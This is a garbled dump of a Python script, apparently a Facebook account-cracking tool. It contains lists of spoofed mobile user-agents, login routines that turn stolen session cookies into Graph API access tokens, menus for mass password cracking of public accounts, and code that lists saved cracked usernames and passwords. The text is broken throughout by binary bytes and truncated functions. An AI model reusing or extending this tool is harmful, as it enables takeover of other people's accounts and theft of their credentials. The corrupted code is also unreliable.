AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J530F/J530FXXS5BSE3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G935T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4252.0 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A8000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-A51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36r   z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S215DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-P205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M015G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A415F/A415FXXU1ATE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A125F/A125FXXU1ATL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A107M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A025G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015T1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T865) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T595) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M305M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G970F/G970FXXU8DTH7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A3050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A605K/KKU3CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXSBDTJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T385) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXSFCTG8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A510F/A510FXXU7CRL2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G906K/KTU1CPL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A700FD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-T287) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36��Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36r   z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A707F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A705FN/A705FNXXU5BTJ4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A305GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G970F/G970FXXU3ASJD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36zMozilla/5.0 (Linux; Android 9; en-au; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750GN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N950N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J415FN/J415FNXXU2BSDL Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J730GM Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-N950N/KSU4CRJ2 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J720M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930VL Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930R6 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520S Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A320Y Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-T825 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J727R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G928T Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-N915S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-G900T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.0.1; en-au; SAMSUNG SGH-M919V Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Mobile Safari/537.36z�Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J720F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safa��Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36r   z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A600FN/A600FNXXU3BSD2 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T587 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-P580 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G615FU Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G610M Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G390F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J600FN/J600FNXXU3ASC1 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G950F/G950FXXS4CRLC Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G891A Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G570M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-C5000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A910F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T385 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T355 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810Y Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9.0.0; en-au; SAMSUNG SM-GT9001 Build/R18NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36z[1;90mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;97mz[36;1mz[0mz[mz[93mz[32mz[95mz[33mz[0;34m�
user-agentz�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]ZJanuariZFebruariZMaretZAprilZMeiZJuniZJuliZAgustusZ	SeptemberZOktoberZNovemberZDesember)�1�2�3�4�5�6�7�8�9�10�11�12)�01�02�03�04Z05Z06Z07Z08Z09r'   r(   r)   zhttps://lookup-id.com/�https://free.facebook.com.comzhttps://www.httpbin.org/ipzhttps://graph.facebook.com/{})z
index.php?z*next=https%3A%2F%2Fdevelopers.facebook.comz%2Ftools%2Fdebugz%2Faccesstoken%2F)�loginzdevice-basedzvalidate-passwordz?shbl=0)Ztools�debugZaccesstokenzen-GB,q=0.8z�Mozilla/-N29; HMSCore 6.4.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.1.302 Mobile Safari/537.36zOK-�-z.txtzCP-c                   C   s   t �d� d S )N�clear)�os�system� r5   r5   �PRO3.pyr2   D   s   r2   c                   C   s
   t �  d S )N)r/   r5   r5   r5   r6   �backF   s   
r7   c                   C   s   t �  td� d S )NuN  
	                                                                                                                                                               
[1;32m              
[1;32m

[1;32m           
    _ ___  _    _ 
   / |\  \//   / |
   | | \  /    | |
/\_| | /  \ /\_| |
\____//__/\\\____/
                  
                  
                  
                  
                  
                  
                  

[1;32m           
[1;32m             [1;32m                               \/         \/        \/        \/                                 
[1;32m THIS TOOL🛑WAS DECODED BY YOUNG JUNAEID CODER 🥷
[1;32m KNOWN AS GHOSTSON 👻
[1;32m AUTHOR  : JUNAEID 
[1;32m WHASAP : +601117432606
[1;32m VERSION : 10.00
[1;32m GITHUB : JXJ-JUNAEID-BRO
[1;97m——————————————————————————— )r2   r	   r5   r5   r5   r6   �bannerH   s   r8   c                  C   s�   t t�� �t t�� � } d�| �}td| � z1t�d�j}||v r4td� t t�� �}t	�




�rF   c                  C   s�   z_t dd��� } t�| � z"t�dtd  �}t�|j�d }t�|j�d }t	||� W W d S  t
y=   t�  Y W d S  tjj
y_   t�  d}t|dd	�}t� j|dd	� t�  Y W d S w  tyl   t�  Y d S w )
N�
.token.txt�r�+https://graph.facebook.com/me?access_token=r   rE   rG   �2# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI�green�Zstyle)�open�read�tokenku�appendr>   r?   �json�loadsr@   �menu�KeyError�
login_lagi334�
exceptions�ConnectionErrorr8   �mark�solr	   rD   �IOError)�tokenZsyZsy2Zsy3�li�lor5   r5   r6   r/   r   s(   
��r/   c                  C   sF  t �  d} t| dd�}tt|dd�� td�}|dv r�d}t|dd�}t� �|� ttd	 t d
 t d �}tdd
��	|�}z%t
�d| �}t�
|j�d }d}	t|	dd�}
t� j|
dd� t�  W d S  ty�   d}	t|	dd�}
t� j|
dd� t�d� t�  Y d S  t
jjy�   d}t|dd�}t� j|dd� t�  Y d S w |dv �r!zLd}t|dd�}t� �|� td�}
t
jdddddddddd d!�	d"|
id#�}t�d$|j�}tdd
��	|�d%��}d&}t|dd�}t� �|� t�  W d S  t�y  } zt�d'� d(}t|dd�}t� �|� t�  W Y d }~d S d }~ww d S ))Nz;[bold green][01] LOGIN TOKEN
[02] LOGIN COOKIE[/bold green]rM   rN   z[bold green] LOGIN[/bold green]��titleu
   [•] MENU : �r   r*   zLOGIN USING THE ACCESS TOKEN�[�fz
] Token : rI   �wrK   rG   zLOGIN SUCCESSFUL ,RETRY ! !zLOGIN GAGAL + GANTI TOKEN !g      @z.PROBLEM INTERNET CONNECTION, CHECK & TRY AGAIN�r   r+   zLOGIN COOKIEz	Cookie : z0https://business.facebook.com/business_locationsz�Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.comr   �#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	max-age=0z�text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8ztext/html; charset=utf-8)	r   �refererZhost�origin�upgrade-insecure-requests�accept-language�
cache-control�accept�content-type�cookie)�headers�cookiesz	(EAAG\w+)r   z LOGIN SUCCESSFUL, Jalankan Ulangzrm -f .token.txtz# COOKIE KADALUARSA / AKUN CP )r8   �nel�cetak�inputrZ   r[   r	   �hrO   �writer>   r?   rS   rT   r@   rD   rV   rA   rB   rW   rX   rY   �re�search�group�	Exceptionr3   r4   )ZskyZsky2�pilZcikZcik2Zpanda�akunZtesZtes3ZsueZsuur^   r_   rp   �dataZ
find_tokenZken�er5   r5   r6   rW   �   sh   
�
(
���rW   c                 C   sL  z	t �d��� }W n   ddi}Y z%t�d�d }ttt�d�d � }t�d�d }|d | d | }W n   d}Y t�  d	}td
t	 � tdt	 � t
|dd
�}t� �|� tt	d t	 d t	 d t| � � tt	d t	 d t	 d t|� � tt	d t	 d t	 d t|� � tt	d t	 d t	 d t|d � � d}	t|	dd
�}
t
t|
dd�� tt	d t	 d t	 d �}|dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv �rt�d� tt	d t	 d t	 d � t�d� d }t� �t
|dd
�� t�  d S d!}
t� �t
|
dd
�� t�  d S )"Nzhttps://httpbin.org/iprj   r1   �/r   r   �   � u   ✓ SLIMWIZ✓z%s Tools By GHOSTED u,   %s Ghostson TEAM®  ' COPYRIGHT YEAR' 2022  rM   rN   rc   �   ➣z] ID USERNAME  : z] FB ID     : z] ID DATE   : z] IP ADDRESS  : z�[bold green][01] Crack Dari Public
[02] Crack Dari Public (Massal)
[03] Cek Hasil Crack
[04] CHECKPOINT DETECTOR
[00] LOGOUT[/bold green]z[bold green]MENU[/bold green]r`   �	] MENU : rb   rf   �r    r,   )r!   r-   ��0Z00zrm -rf .token.txt�   •z
] Wait ...z# BERHASIL LOG OUT�# PILIHAN TIDAK ADA DI MENU)r>   r?   rS   Zmy_birthday�split�dic2r:   r8   r	   rv   rZ   r[   rs   rt   ru   �dump_publik�dump_massal�result�filer3   r4   rA   rB   rD   )Zmy_nameZmy_id�shZtglxZblnxZthnxZbirthZsgZfx�ioZoiZjh�sw�ricr5   r5   r6   rU   �   sP   $$$(








rU   c               	   C   s�  d} t � �t| dd�� d}t|dd�}tt|dd�� ttd t d	 t d
 �}|dv �r�zt�d�}W n t	yS   d
}t � �t|dd�� t
�d� t�  Y nw t
|�dkrpd}t � �t|dd�� t
�d� t�  d S d}t � �t|dd�� d}i }	|D ]o}
ztd|
 d��� }W n   Y q�|d7 }|dk r�dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt
|�� d t � q�|	�t|�t|
�i� tdt|� d |
 d tt
|�� d t � q�d}
t � �t|
dd�� ttd t d	 t d �}z|	| }W n t�y+   d}t � �t|dd�� t�  Y nw z
td| d��� �� }W n   d}t � �t|dd�� t
�d� t�  Y d}t � �t|dd�� d}tt
|��D ]$}|| �d�}d |d � d!|d � �}t � �t|dd�� |d7 }�qfd}t � �t|dd�� ttd t d" t d# � t�  d S |d$v �r=zt�d%�}W n t	�y�   d
}t � �t|d&d�� t
�d� t�  Y nw t
|�dk�r�d'}t � �t|d&d�� t
�d� t�  d S d(}t � �t|d&d�� d}i }	|D ]s}
ztd)|
 d��� }W n   Y �q|d7 }|d*k �rSdt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt
|�� d t � �q|	�t|�t|
�i� tdt|� d |
 d tt
|�� d t � �qd}
t � �t|
d&d�� ttd t d	 t d �}z|	| }W n t�y�   d}t � �t|d+d�� t�  Y nw z
td)| d��� �� }W n   d}t � �t|d+d�� t
�d� t�  Y d(}t � �t|d+d�� d}tt
|��D ]1}|| �d�}d |d � d!|d � �}t � �t|d+d�� tt� d,t� |d � �� |d7 }�q�d(}t � �t|d&d�� ttd t d" t d# � t�  d S |d-v �rGt�  d S d}t � �t|d+d�� t�  d S ).Nz# CHECK CRACK RESULTzbold yellowrN   zB[bold yellow][01] RESULT CP
[02] RESULT OK
[00] MENU[/bold yellow]ZyellowZRESULTSr`   rc   rd   �] MENU: rb   �CPz# DIREKTORI TIDAK DITEMUKANr�   r   z# ANDA BELUM MEMILIKI RESULT CPz# HASIL CP ANDA�CP/rJ   r   �
   r�   �] � ---> � Akunz# CHECK CLONE RESULTSr�   r�   �+# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGIz# CP IDS�|z
# USERNAME : z PASSWORD : r�   z] BACKrf   �OKrM   z# ANDA BELUM MEMILIKI RESULT OKz# OK IDS�OK/�d   z
bold greenz	COOKIE : r�   )r[   r	   rZ   rs   rt   ru   rv   r3   �listdir�FileNotFoundErrorrA   rB   r7   �lenrO   �	readlinesr:   �update�xrV   rD   rP   �
splitlines�ranger�   )�cekZkayesZkisZkzZvinZgadaZhahaZgerr�cih�lol�isi�hem�nomZgerr2�geeh�gehr�   Zlin�heher}   ZnocpZcpkuZcpkuniZcpkuhZakun2r5   r5   r6   r�   �   s�   


�


.2
�




�


04
�




r�   c                  C   s4  d} t � jt| dd�dd� ttd t d t d � t�d� d	}t � �t|dd�� g }zt�d
�}|D ]}|�|� q7W n   Y zt�d�}|D ]}|�|� qMW n   Y t	|�dkrrd
}t � �t|dd�� t
�  d S d}i }	|D ]�}
ztd|
 d��� }W n   ztd|
 d��� }W n   Y Y qxY |d7 }|dk r�dt
|� }|	�t
|�t
|
�i� |	�|t
|
�i� td| d |
 d t
t	|�� d t � qx|	�t
|�t
|
�i� tdt
|� d |
 d t
t	|�� d t � qxd	}
t � �t|
dd�� ttd t d t d �}z|	| }W n t�y2   d}t � �t|dd�� t
�  Y nw ztd| d��� }|D ]}t�|�dd�� �q?t�  W d S  t�y�   ztd| d��� }|D ]}t�|�dd�� �qet�  W Y d S  t�y�   d}t � �t|dd�� t�d� t�  Y Y d S w w )Nz# CEK OPSI DARI FILErM   rN   zon greenrc   r�   z*] Sedang Membaca File, Tunggu Sebentar ...r�   z# PILIH FILE YG AKAN DI CEKr�   r�   r   z(# ANDA BELUM MEMILIKI RESULT UNTUK DICEKr�   rJ   r�   r   r�   r�   r�   r�   r�   rd   r�   r�   �
